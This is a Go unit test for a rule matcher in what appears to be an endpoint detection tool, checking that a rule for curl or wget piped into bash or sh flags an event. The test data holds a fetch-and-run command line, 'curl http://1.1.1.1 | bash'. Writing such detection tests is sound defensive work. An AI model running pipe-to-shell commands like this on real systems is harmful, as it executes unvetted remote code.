package rules

import (
	"testing"

	"microedr/pkg/model"
)

func TestMatch(t *testing.T) {
	ev := model.Event{
		EventType: "proc.exec",
		Process: model.ProcessInfo{
			Exe:     "/usr/bin/curl",
			Cmdline: "curl http://1.1.1.1 | bash",
		},
	}
	r := Rule{
		ID:        "R1001",
		EventType: "proc.exec",
		ExeAny:    []string{"/usr/bin/curl", "/usr/bin/wget"},
		CmdHasAny: []string{"| bash", "| sh"},
	}
	if !Match(ev, r) {
		t.Fatal("expected rule to match")
	}
}

